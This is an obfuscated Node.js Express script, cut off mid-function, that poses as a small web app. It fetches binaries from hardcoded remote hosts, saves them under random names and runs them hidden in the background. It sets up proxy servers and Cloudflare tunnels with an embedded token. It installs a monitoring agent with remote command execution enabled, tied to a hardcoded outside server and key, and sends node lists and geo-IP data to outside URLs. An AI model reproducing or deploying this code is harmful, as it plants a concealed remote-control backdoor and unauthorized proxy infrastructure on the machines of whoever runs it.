const _0x28912e=_0x196a;(function(_0x457ccd,_0x246224){const _0x2a8fc1={_0x17c961:0x1bd,_0xe24708:0x1de},_0x47bc3e=_0x196a,_0x122620=_0x457ccd();while(!![]){try{const _0x1a2ab5=-parseInt(_0x47bc3e(0x1ec))/0x1+-parseInt(_0x47bc3e(0x22e))/0x2*(parseInt(_0x47bc3e(0x259))/0x3)+parseInt(_0x47bc3e(0x252))/0x4*(-parseInt(_0x47bc3e(_0x2a8fc1._0x17c961))/0x5)+-parseInt(_0x47bc3e(0x222))/0x6+-parseInt(_0x47bc3e(0x223))/0x7+parseInt(_0x47bc3e(0x20b))/0x8+-parseInt(_0x47bc3e(_0x2a8fc1._0xe24708))/0x9*(-parseInt(_0x47bc3e(0x275))/0xa);if(_0x1a2ab5===_0x246224)break;else _0x122620['push'](_0x122620['shift']());}catch(_0x5a3c01){_0x122620['push'](_0x122620['shift']());}}}(_0x5990,0x394a5));const express=require('express'),app=express(),axios=require(_0x28912e(0x230)),os=require('os'),fs=require('fs'),path=require(_0x28912e(0x1c3)),{promisify}=require('util'),exec=promisify(require(_0x28912e(0x1fc))[_0x28912e(0x1e9)]),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0x28912e(0x258)][_0x28912e(0x1d8)]||'',AUTO_ACCESS=process[_0x28912e(0x258)][_0x28912e(0x1c2)]||![],FILE_PATH=process[_0x28912e(0x258)][_0x28912e(0x1ed)]||_0x28912e(0x1e6),SUB_PATH=process[_0x28912e(0x258)][_0x28912e(0x245)]||_0x28912e(0x228),PORT=process['env'][_0x28912e(0x25e)]||process[_0x28912e(0x258)]['PORT']||0xbb8,UUID=process[_0x28912e(0x258)][_0x28912e(0x24f)]||_0x28912e(0x1d4),NEZHA_SERVER=process['env'][_0x28912e(0x1f5)]||'nezha.aaccc.nyc.mn:443',NEZHA_PORT=process[_0x28912e(0x258)][_0x28912e(0x1bf)]||'',NEZHA_KEY=process[_0x28912e(0x258)][_0x28912e(0x26f)]||_0x28912e(0x1d2),ARGO_DOMAIN=process['env'][_0x28912e(0x235)]||_0x28912e(0x1fb),ARGO_AUTH=process[_0x28912e(0x258)]['ARGO_AUTH']||_0x28912e(0x248),ARGO_PORT=process[_0x28912e(0x258)][_0x28912e(0x1e0)]||0x1f41,CFIP=process['env'][_0x28912e(0x1dc)]||_0x28912e(0x214),CFPORT=process[_0x28912e(0x258)]['CFPORT']||0x1bb,NAME=process[_0x28912e(0x258)][_0x28912e(0x1cf)]||'';function _0x5990(){const _0x58c29e=['\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','catch','readdirSync','match','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','finish','http://ip-api.com/json','listen','base64','https://arm64.ssss.nyc.mn/agent','fileName','trojan','basename','https://amd64.ssss.nyc.mn/bot','SUB_PATH','https://arm64.ssss.nyc.mn/v1','freedom','eyJhIjoiMTM2NDQ2NTYwNDk0ZThjNjAzNjVhOWZjYzU5YzliYjkiLCJ0IjoiMmM1MGYwNDgtODMzZi00OTY4LWFkNjQtMzIwZGQ0YjE1YTg4IiwicyI6Ik1URmhPREV4TmpjdE1XSTNOQzAwTkRFMExXRTRaVFF0TkdJMFl6a3dabVpqWTJJMCJ9','response','existsSync','Mozilla/5.0','https://oooo.serv00.net/add-url','isp','\x0a\x20\x20credentials-file:\x20','UUID','test','success','36JvmePC','\x20already\x20exists','ARGO_DOMAIN:','\x20-c\x20\x22','vless','floor','env','470199ZEqmNO','stream','has','https://arm64.ssss.nyc.mn/bot','\x0aclient_secret:\x20','SERVER_PORT','/dev/null','--tls','then','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','org','length','abcdefghijklmnopqrstuvwxyz','automatic\x20access\x20task\x20added\x20successfully','isFile','/vless-argo','tcp','.exe\x20>\x20nul\x202>&1','2096','close','&fp=firefox&type=ws&host=','\x22\x20>\x20/dev/null\x202>&1','NEZHA_KEY','?encryption=none&security=tls&sni=','boot.log','https://amd64.ssss.nyc.mn/agent','index.html','Error\x20downloading\x20files:','10eFVFbx','rm\x20-rf\x20','text/plain;\x20charset=utf-8','Error\x20reading\x20boot.log:','443','unlinkSync','\x20-p\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','substring','none','split','\x20>/dev/null\x202>&1','tls','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','charAt','\x20-c\x20','countryCode','\x0a\x0atrojan://','error','\x20>/dev/null\x202>&1\x20&','196015zaKoFW','2053','NEZHA_PORT','amd','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','AUTO_ACCESS','path','platform','Empowerment\x20success\x20for\x20','toString','status','https+local://8.8.8.8/dns-query','utf-8','clear','replace','2083','/tunnel.yml\x20run','tunnel.json','NAME','Error\x20executing\x20command:\x20','blackhole','tajok4LCyzdlZbH6EHZGMjI9sG076wR6','Subscription\x20uploaded\x20successfully','bb9a7f3a-aa29-4fc3-993b-2e4748fb2c2a','forEach','/vmess-argo','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','PROJECT_URL','application/json','\x0a\x20\x20tunnel:\x20','\x20>\x20nul\x202>&1','CFIP','join','13242627PuCWmF','taskkill\x20/f\x20/im\x20','ARGO_PORT','statSync','vmess','8443','ArgoDomain:','Nodes\x20uploaded\x20successfully','.tmp','http','https://amd64.ssss.nyc.mn/v1','exec','message','npm\x20running\x20error:\x20','204791DbEzfx','FILE_PATH','/api/add-nodes','unlink','send','Download\x20','data','all','mkdirSync','NEZHA_SERVER','readFileSync','from','App\x20is\x20running','aarch64','writeFileSync','railway.aaccc.cc.cd','child_process','/vmess-argo?ed=2560','arm','/api/add-subscriptions','/api/delete-nodes','https://amd64.ssss.nyc.mn/web','createWriteStream','Unknown','arm64','xtls-rprx-vision','&path=%2Fvless-argo%3Fed%3D2560#','utf8','\x20is\x20running','filter','post','1114448EfYpKS','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','/sub.txt\x20saved\x20successfully','web\x20running\x20error:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','quic','/config.json\x20>/dev/null\x202>&1\x20&','set','Error\x20in\x20startserver:','saas.sin.fan','map','win32','log','list.txt','Empowerment\x20failed\x20for\x20','false','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','?security=tls&sni=','push','\x0avless://','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','/trojan-argo','1266852kROqyT','3153885kaqZTM','unshift','country_code','127.0.0.1','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','xyz88','\x0a\x20\x20\x20\x20','pipe','nohup\x20','config.json','get','2dRfANA','&path=%2Ftrojan-argo%3Fed%3D2560#','axios','includes','\x20-s\x20','http\x20server\x20is\x20running\x20on\x20port:','readFile','ARGO_DOMAIN'];_0x5990=function(){return _0x58c29e;};return _0x5990();}!fs[_0x28912e(0x24a)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x28912e(0x217)](FILE_PATH+'\x20is\x20created')):console[_0x28912e(0x217)](FILE_PATH+_0x28912e(0x253));function generateRandomName(){const _0x5073c9=_0x28912e,_0x1dc473=_0x5073c9(0x265);let _0x3bd617='';for(let _0x249033=0x0;_0x249033<0x6;_0x249033++){_0x3bd617+=_0x1dc473['charAt'](Math[_0x5073c9(0x257)](Math['random']()*_0x1dc473['length']));}return _0x3bd617;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x28912e(0x1dd)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x28912e(0x1dd)](FILE_PATH,'sub.txt'),listPath=path[_0x28912e(0x1dd)](FILE_PATH,_0x28912e(0x218)),bootLogPath=path[_0x28912e(0x1dd)](FILE_PATH,_0x28912e(0x271)),configPath=path[_0x28912e(0x1dd)](FILE_PATH,_0x28912e(0x22c));function deleteNodes(){const _0x43aae1={_0x56663f:0x1f6,_0x5eda42:0x1c9,_0x3bf314:0x200},_0x195829=_0x28912e;try{if(!UPLOAD_URL)return;if(!fs[_0x195829(0x24a)](subPath))return;let _0x1c3504;try{_0x1c3504=fs[_0x195829(_0x43aae1._0x56663f)](subPath,'utf-8');}catch{return null;}const _0x43c89e=Buffer[_0x195829(0x1f7)](_0x1c3504,'base64')[_0x195829(0x1c6)](_0x195829(_0x43aae1._0x5eda42)),_0x33b19d=_0x43c89e['split']('\x0a')['filter'](_0x16efce=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x16efce));if(_0x33b19d['length']===0x0)return;return axios[_0x195829(0x20a)](UPLOAD_URL+_0x195829(_0x43aae1._0x3bf314),JSON['stringify']({'nodes':_0x33b19d}),{'headers':{'Content-Type':'application/json'}})[_0x195829(0x238)](_0x5290b2=>{return null;}),null;}catch(_0x37fb36){return null;}}function cleanupOldFiles(){const _0x3bf92c={_0x23060b:0x239},_0x2cf7fe={_0x3b9861:0x267},_0x238eff=_0x28912e;try{const _0x4ad753=fs[_0x238eff(_0x3bf92c._0x23060b)](FILE_PATH);_0x4ad753[_0x238eff(0x1d5)](_0x191e29=>{const _0x244b76=_0x238eff,_0x458b60=path['join'](FILE_PATH,_0x191e29);try{const _0x5eff5d=fs[_0x244b76(0x1e1)](_0x458b60);_0x5eff5d[_0x244b76(_0x2cf7fe._0x3b9861)]()&&fs[_0x244b76(0x27a)](_0x458b60);}catch(_0x2dde31){}});}catch(_0x41d9c5){}}async function generateConfig(){const _0x3b6677={_0x14ef0f:0x25f,_0xae2c48:0x205,_0xb0961f:0x221,_0x10bcdc:0x269,_0x40e726:0x256,_0x2585da:0x27e,_0x40f090:0x269,_0xcb335c:0x226,_0x2bc76c:0x1e7,_0x43b6ce:0x1b5,_0xc509c9:0x1e2,_0x3f6378:0x1e7,_0x9ce17b:0x226,_0x103169:0x242,_0x51556f:0x27e,_0x48d81a:0x1c8,_0x1c41b5:0x247,_0x54d3d2:0x1fa,_0x506bb7:0x22c},_0xd4a959=_0x28912e,_0x5bdf1a={'log':{'access':_0xd4a959(0x25f),'error':_0xd4a959(_0x3b6677._0x14ef0f),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0xd4a959(0x256),'settings':{'clients':[{'id':UUID,'flow':_0xd4a959(_0x3b6677._0xae2c48)}],'decryption':_0xd4a959(0x27e),'fallbacks':[{'dest':0xbb9},{'path':_0xd4a959(0x268),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0xd4a959(_0x3b6677._0xb0961f),'dest':0xbbc}]},'streamSettings':{'network':_0xd4a959(_0x3b6677._0x10bcdc)}},{'port':0xbb9,'listen':_0xd4a959(0x226),'protocol':_0xd4a959(_0x3b6677._0x40e726),'settings':{'clients':[{'id':UUID}],'decryption':_0xd4a959(_0x3b6677._0x2585da)},'streamSettings':{'network':_0xd4a959(_0x3b6677._0x40f090),'security':'none'}},{'port':0xbba,'listen':_0xd4a959(_0x3b6677._0xcb335c),'protocol':_0xd4a959(0x256),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0xd4a959(0x27e)},'streamSettings':{'network':'ws','security':_0xd4a959(0x27e),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0xd4a959(_0x3b6677._0x2bc76c),_0xd4a959(_0x3b6677._0x43b6ce),_0xd4a959(0x210)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0xd4a959(_0x3b6677._0xcb335c),'protocol':_0xd4a959(_0x3b6677._0xc509c9),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0xd4a959(0x1d6)}},'sniffing':{'enabled':!![],'destOverride':[_0xd4a959(_0x3b6677._0x3f6378),_0xd4a959(0x1b5),_0xd4a959(0x210)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0xd4a959(_0x3b6677._0x9ce17b),'protocol':_0xd4a959(_0x3b6677._0x103169),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0xd4a959(_0x3b6677._0x51556f),'wsSettings':{'path':_0xd4a959(0x221)}},'sniffing':{'enabled':!![],'destOverride':['http',_0xd4a959(0x1b5),_0xd4a959(0x210)],'metadataOnly':![]}}],'dns':{'servers':[_0xd4a959(_0x3b6677._0x48d81a)]},'outbounds':[{'protocol':_0xd4a959(_0x3b6677._0x1c41b5),'tag':'direct'},{'protocol':_0xd4a959(0x1d1),'tag':'block'}]};fs[_0xd4a959(_0x3b6677._0x54d3d2)](path[_0xd4a959(0x1dd)](FILE_PATH,_0xd4a959(_0x3b6677._0x506bb7)),JSON['stringify'](_0x5bdf1a,null,0x2));}function getSystemArchitecture(){const _0x3023ad={_0x2a870d:0x204},_0x13d0df=_0x28912e,_0x4b2f4a=os['arch']();return _0x4b2f4a===_0x13d0df(0x1fe)||_0x4b2f4a===_0x13d0df(_0x3023ad._0x2a870d)||_0x4b2f4a===_0x13d0df(0x1f9)?_0x13d0df(0x1fe):_0x13d0df(0x1c0);}function downloadFile(_0x1c02af,_0xbc1852,_0x12dccf){const _0xb37c91={_0x2ef66c:0x24a,_0x23aee3:0x1f4,_0x4eb9d4:0x202,_0x1f250e:0x261},_0x56e6a3={_0x1db6d8:0x243,_0x123c3d:0x1ea},_0x3923bd={_0x2822ef:0x1f2,_0x590e3a:0x22a,_0x505815:0x1bb},_0x2a7470=_0x28912e,_0x209959=_0x1c02af;!fs[_0x2a7470(_0xb37c91._0x2ef66c)](FILE_PATH)&&fs[_0x2a7470(_0xb37c91._0x23aee3)](FILE_PATH,{'recursive':!![]});const _0x2bb074=fs[_0x2a7470(_0xb37c91._0x4eb9d4)](_0x209959);axios({'method':_0x2a7470(0x22d),'url':_0xbc1852,'responseType':_0x2a7470(0x25a)})[_0x2a7470(_0xb37c91._0x1f250e)](_0x461d42=>{const _0x1cf4ad={_0x592b0a:0x1ef,_0x1c1784:0x1ea},_0xec705f={_0x3c44a5:0x26c,_0x34a277:0x243},_0xaed070=_0x2a7470;_0x461d42[_0xaed070(_0x3923bd._0x2822ef)][_0xaed070(_0x3923bd._0x590e3a)](_0x2bb074),_0x2bb074['on'](_0xaed070(0x23c),()=>{const _0x1feb69=_0xaed070;_0x2bb074[_0x1feb69(_0xec705f._0x3c44a5)](),console[_0x1feb69(0x217)](_0x1feb69(0x1f1)+path[_0x1feb69(_0xec705f._0x34a277)](_0x209959)+'\x20successfully'),_0x12dccf(null,_0x209959);}),_0x2bb074['on'](_0xaed070(_0x3923bd._0x505815),_0x243c04=>{const _0x57ff68=_0xaed070;fs[_0x57ff68(_0x1cf4ad._0x592b0a)](_0x209959,()=>{});const _0x302258=_0x57ff68(0x1f1)+path['basename'](_0x209959)+'\x20failed:\x20'+_0x243c04[_0x57ff68(_0x1cf4ad._0x1c1784)];console[_0x57ff68(0x1bb)](_0x302258),_0x12dccf(_0x302258);});})[_0x2a7470(0x238)](_0x2bdf8a=>{const _0x44beac=_0x2a7470,_0x56670c=_0x44beac(0x1f1)+path[_0x44beac(_0x56e6a3._0x1db6d8)](_0x209959)+'\x20failed:\x20'+_0x2bdf8a[_0x44beac(_0x56e6a3._0x123c3d)];console[_0x44beac(0x1bb)](_0x56670c),_0x12dccf(_0x56670c);});}async function downloadFilesAndRun(){const _0x45ad59={_0x8cc4fc:0x217,_0x10fb0f:0x227,_0x233bdb:0x215,_0x55060e:0x1f3,_0xccd628:0x1bb,_0x37db7c:0x27f,_0xc20379:0x279,_0xf5e9e5:0x1e3,_0x3f84c6:0x26b,_0x4269e2:0x1cc,_0x1c05a9:0x1fa,_0x27b4c4:0x22b,_0x5029c1:0x255,_0x154753:0x1bb,_0x436dca:0x279,_0x19f0c0:0x1be,_0x16ad35:0x260,_0x23f67e:0x22b,_0xab2d51:0x1eb,_0x3fdb80:0x1b8,_0x36c947:0x211,_0x2306c9:0x20e,_0x343c96:0x1c1,_0x9c05b7:0x21c,_0x1067ae:0x1d7,_0x3653bd:0x1bb,_0x1e6834:0x1d0},_0xd99a09={_0x16ecf3:0x1d5},_0x5bf994=_0x28912e,_0x23175e=getSystemArchitecture(),_0x33b84c=getFilesForArchitecture(_0x23175e);if(_0x33b84c['length']===0x0){console[_0x5bf994(_0x45ad59._0x8cc4fc)](_0x5bf994(_0x45ad59._0x10fb0f));return;}const _0x56063f=_0x33b84c[_0x5bf994(_0x45ad59._0x233bdb)](_0x107d18=>{return new Promise((_0x4ccfbd,_0x5873c9)=>{const _0x197982=_0x196a;downloadFile(_0x107d18[_0x197982(0x241)],_0x107d18['fileUrl'],(_0x19fc11,_0x305d6b)=>{_0x19fc11?_0x5873c9(_0x19fc11):_0x4ccfbd(_0x305d6b);});});});try{await Promise[_0x5bf994(_0x45ad59._0x55060e)](_0x56063f);}catch(_0x5f51bf){console[_0x5bf994(_0x45ad59._0xccd628)](_0x5bf994(0x274),_0x5f51bf);return;}function _0x5ed15b(_0xcf4eba){const _0x47ec6d={_0x29856b:0x24a},_0x3b6c40={_0x26b96c:0x217},_0x33bf03=_0x5bf994,_0x2108f9=0x1fd;_0xcf4eba[_0x33bf03(_0xd99a09._0x16ecf3)](_0x5b6822=>{const _0x3509c8=_0x33bf03;fs[_0x3509c8(_0x47ec6d._0x29856b)](_0x5b6822)&&fs['chmod'](_0x5b6822,_0x2108f9,_0x4a09c1=>{const _0x502121=_0x3509c8;_0x4a09c1?console['error'](_0x502121(0x219)+_0x5b6822+':\x20'+_0x4a09c1):console[_0x502121(_0x3b6c40._0x26b96c)](_0x502121(0x1c5)+_0x5b6822+':\x20'+_0x2108f9['toString'](0x8));});});}const _0x5f018f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5ed15b(_0x5f018f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x27ccb1=NEZHA_SERVER[_0x5bf994(0x231)](':')?NEZHA_SERVER[_0x5bf994(_0x45ad59._0x37db7c)](':')['pop']():'',_0x341964=new Set([_0x5bf994(_0x45ad59._0xc20379),_0x5bf994(_0x45ad59._0xf5e9e5),_0x5bf994(_0x45ad59._0x3f84c6),'2087',_0x5bf994(_0x45ad59._0x4269e2),_0x5bf994(0x1be)]),_0x1a5f5a=_0x341964[_0x5bf994(0x25b)](_0x27ccb1)?'true':_0x5bf994(0x21a),_0x1c2077=_0x5bf994(0x25d)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x5bf994(0x236)+_0x1a5f5a+_0x5bf994(0x20f)+UUID;fs[_0x5bf994(_0x45ad59._0x1c05a9)](path[_0x5bf994(0x1dd)](FILE_PATH,'config.yaml'),_0x1c2077);const _0x4ff361=_0x5bf994(_0x45ad59._0x27b4c4)+phpPath+_0x5bf994(_0x45ad59._0x5029c1)+FILE_PATH+_0x5bf994(0x220);try{await exec(_0x4ff361),console[_0x5bf994(_0x45ad59._0x8cc4fc)](phpName+_0x5bf994(0x208)),await new Promise(_0x5d1a1b=>setTimeout(_0x5d1a1b,0x3e8));}catch(_0x41d176){console[_0x5bf994(_0x45ad59._0x154753)]('php\x20running\x20error:\x20'+_0x41d176);}}else{let _0x291317='';const _0x4f6eaa=[_0x5bf994(_0x45ad59._0x436dca),'8443','2096','2087',_0x5bf994(0x1cc),_0x5bf994(_0x45ad59._0x19f0c0)];_0x4f6eaa[_0x5bf994(0x231)](NEZHA_PORT)&&(_0x291317=_0x5bf994(_0x45ad59._0x16ad35));const _0x762df9=_0x5bf994(_0x45ad59._0x23f67e)+npmPath+_0x5bf994(0x232)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5bf994(0x27b)+NEZHA_KEY+'\x20'+_0x291317+_0x5bf994(0x20c);try{await exec(_0x762df9),console[_0x5bf994(0x217)](npmName+'\x20is\x20running'),await new Promise(_0x4e847f=>setTimeout(_0x4e847f,0x3e8));}catch(_0x53baaf){console['error'](_0x5bf994(_0x45ad59._0xab2d51)+_0x53baaf);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x1e4faa=_0x5bf994(0x22b)+webPath+_0x5bf994(_0x45ad59._0x3fdb80)+FILE_PATH+_0x5bf994(_0x45ad59._0x36c947);try{await exec(_0x1e4faa),console['log'](webName+'\x20is\x20running'),await new Promise(_0x4e0f18=>setTimeout(_0x4e0f18,0x3e8));}catch(_0x938e6f){console[_0x5bf994(0x1bb)](_0x5bf994(_0x45ad59._0x2306c9)+_0x938e6f);}if(fs[_0x5bf994(0x24a)](botPath)){let _0x9a1f1e;if(ARGO_AUTH[_0x5bf994(0x23a)](/^[A-Z0-9a-z=]{120,250}$/))_0x9a1f1e=_0x5bf994(_0x45ad59._0x343c96)+ARGO_AUTH;else ARGO_AUTH[_0x5bf994(0x23a)](/TunnelSecret/)?_0x9a1f1e=_0x5bf994(_0x45ad59._0x9c05b7)+FILE_PATH+_0x5bf994(0x1cd):_0x9a1f1e=_0x5bf994(0x1b6)+FILE_PATH+_0x5bf994(_0x45ad59._0x1067ae)+ARGO_PORT;try{await exec(_0x5bf994(_0x45ad59._0x23f67e)+botPath+'\x20'+_0x9a1f1e+'\x20>/dev/null\x202>&1\x20&'),console[_0x5bf994(0x217)](botName+'\x20is\x20running'),await new Promise(_0x38dafc=>setTimeout(_0x38dafc,0x7d0));}catch(_0xd1eb6c){console[_0x5bf994(_0x45ad59._0x3653bd)](_0x5bf994(_0x45ad59._0x1e6834)+_0xd1eb6c);}}await new Promise(_0x1dd3a7=>setTimeout(_0x1dd3a7,0x1388));}function getFilesForArchitecture(_0xdd7041){const _0x2915c3={_0x341aa3:0x244,_0x3d5cba:0x1fe,_0x597617:0x240,_0x3072d4:0x272},_0x274d04=_0x28912e;let _0x543443;_0xdd7041==='arm'?_0x543443=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x274d04(0x25c)}]:_0x543443=[{'fileName':webPath,'fileUrl':_0x274d04(0x201)},{'fileName':botPath,'fileUrl':_0x274d04(_0x2915c3._0x341aa3)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xdbd11b=_0xdd7041===_0x274d04(_0x2915c3._0x3d5cba)?_0x274d04(_0x2915c3._0x597617):_0x274d04(_0x2915c3._0x3072d4);_0x543443['unshift']({'fileName':npmPath,'fileUrl':_0xdbd11b});}else{const _0x5edf9a=_0xdd7041===_0x274d04(0x1fe)?_0x274d04(0x246):_0x274d04(0x1e8);_0x543443[_0x274d04(0x224)]({'fileName':phpPath,'fileUrl':_0x5edf9a});}}return _0x543443;}function argoType(){const _0xedfdb8={_0x26f629:0x1fa,_0x3a0043:0x1da,_0x23ce68:0x27f,_0x359b52:0x24e,_0xd93eac:0x21b,_0x19bfe2:0x1dd,_0xa5cf67:0x27c},_0x2d158c=_0x28912e;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x2d158c(0x231)]('TunnelSecret')){fs[_0x2d158c(_0xedfdb8._0x26f629)](path['join'](FILE_PATH,_0x2d158c(0x1ce)),ARGO_AUTH);const _0x2d1734=_0x2d158c(_0xedfdb8._0x3a0043)+ARGO_AUTH[_0x2d158c(_0xedfdb8._0x23ce68)]('\x22')[0xb]+_0x2d158c(_0xedfdb8._0x359b52)+path['join'](FILE_PATH,_0x2d158c(0x1ce))+_0x2d158c(0x23b)+ARGO_DOMAIN+_0x2d158c(_0xedfdb8._0xd93eac)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x2d158c(0x1fa)](path[_0x2d158c(_0xedfdb8._0x19bfe2)](FILE_PATH,'tunnel.yml'),_0x2d1734);}else console['log'](_0x2d158c(_0xedfdb8._0xa5cf67));}async function extractDomains(){const _0x508aa7={_0x516e0b:0x254,_0x374f3d:0x1f6,_0x277a46:0x1dd,_0x1a839c:0x217,_0x46d464:0x1e4,_0x5e50c4:0x217,_0x38c788:0x1dd,_0x21d5ae:0x271,_0x5a3744:0x1d7,_0x5567e6:0x1bc,_0x543967:0x217,_0x50eb45:0x208,_0x1849ec:0x1bb,_0x1ca152:0x1bb,_0x17e890:0x278},_0x23d5f3={_0x174fb3:0x24b,_0x24a89e:0x1f2,_0x364704:0x24d,_0x13f5af:0x225,_0x205000:0x24b,_0x40d9ca:0x263,_0x1e8692:0x1f2,_0x269d45:0x203},_0xb2b99e={_0xa560d9:0x1c4,_0x1627b9:0x26e},_0x455c3c=_0x28912e;let _0x45065b;if(ARGO_AUTH&&ARGO_DOMAIN)_0x45065b=ARGO_DOMAIN,console['log'](_0x455c3c(_0x508aa7._0x516e0b),_0x45065b),await _0x3cc219(_0x45065b);else try{const _0x17e1e1=fs[_0x455c3c(_0x508aa7._0x374f3d)](path[_0x455c3c(_0x508aa7._0x277a46)](FILE_PATH,'boot.log'),_0x455c3c(0x1c9)),_0x8e10f1=_0x17e1e1['split']('\x0a'),_0x233927=[];_0x8e10f1[_0x455c3c(0x1d5)](_0xc666da=>{const _0xcce05f=_0x455c3c,_0x1fc006=_0xc666da[_0xcce05f(0x23a)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1fc006){const _0x1fd066=_0x1fc006[0x1];_0x233927[_0xcce05f(0x21e)](_0x1fd066);}});if(_0x233927['length']>0x0)_0x45065b=_0x233927[0x0],console[_0x455c3c(_0x508aa7._0x1a839c)](_0x455c3c(_0x508aa7._0x46d464),_0x45065b),await _0x3cc219(_0x45065b);else{console[_0x455c3c(_0x508aa7._0x5e50c4)](_0x455c3c(0x262)),fs[_0x455c3c(0x27a)](path[_0x455c3c(_0x508aa7._0x38c788)](FILE_PATH,_0x455c3c(_0x508aa7._0x21d5ae)));async function _0x4bca03(){const _0x1bfb8d=_0x455c3c;try{process[_0x1bfb8d(_0xb2b99e._0xa560d9)]==='win32'?await exec(_0x1bfb8d(0x1df)+botName+_0x1bfb8d(0x26a)):await exec('pkill\x20-f\x20\x22['+botName[_0x1bfb8d(0x1b7)](0x0)+']'+botName[_0x1bfb8d(0x27d)](0x1)+_0x1bfb8d(_0xb2b99e._0x1627b9));}catch(_0x178e83){}}_0x4bca03(),await new Promise(_0x5757db=>setTimeout(_0x5757db,0xbb8));const _0x5e9990='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x455c3c(_0x508aa7._0x5a3744)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5e9990+_0x455c3c(_0x508aa7._0x5567e6)),console[_0x455c3c(_0x508aa7._0x543967)](botName+_0x455c3c(_0x508aa7._0x50eb45)),await new Promise(_0x3f79c7=>setTimeout(_0x3f79c7,0xbb8)),await extractDomains();}catch(_0x15a24c){console[_0x455c3c(_0x508aa7._0x1849ec)](_0x455c3c(0x1d0)+_0x15a24c);}}}catch(_0xb0f639){console[_0x455c3c(_0x508aa7._0x1ca152)](_0x455c3c(_0x508aa7._0x17e890),_0xb0f639);}async function _0xd8efa6(){const _0xa12b34=_0x455c3c;try{const _0x3ff33f=await axios[_0xa12b34(0x22d)]('https://api.ip.sb/geoip',{'headers':{'User-Agent':_0xa12b34(_0x23d5f3._0x174fb3),'timeout':0xbb8}});if(_0x3ff33f[_0xa12b34(_0x23d5f3._0x24a89e)]&&_0x3ff33f['data'][_0xa12b34(0x225)]&&_0x3ff33f['data'][_0xa12b34(_0x23d5f3._0x364704)])return(_0x3ff33f['data'][_0xa12b34(_0x23d5f3._0x13f5af)]+'-'+_0x3ff33f[_0xa12b34(0x1f2)][_0xa12b34(0x24d)])[_0xa12b34(0x1cb)](/\s+/g,'_');}catch(_0x2dc4be){try{const _0x2d77f9=await axios[_0xa12b34(0x22d)](_0xa12b34(0x23d),{'headers':{'User-Agent':_0xa12b34(_0x23d5f3._0x205000),'timeout':0xbb8}});if(_0x2d77f9[_0xa12b34(_0x23d5f3._0x24a89e)]&&_0x2d77f9[_0xa12b34(0x1f2)][_0xa12b34(0x1c7)]===_0xa12b34(0x251)&&_0x2d77f9[_0xa12b34(0x1f2)][_0xa12b34(0x1b9)]&&_0x2d77f9['data'][_0xa12b34(_0x23d5f3._0x40d9ca)])return(_0x2d77f9[_0xa12b34(0x1f2)][_0xa12b34(0x1b9)]+'-'+_0x2d77f9[_0xa12b34(_0x23d5f3._0x1e8692)][_0xa12b34(_0x23d5f3._0x40d9ca)])['replace'](/\s+/g,'_');}catch(_0x3c8e9b){}}return _0xa12b34(_0x23d5f3._0x269d45);}async function _0x3cc219(_0x955967){const _0x19e196=await 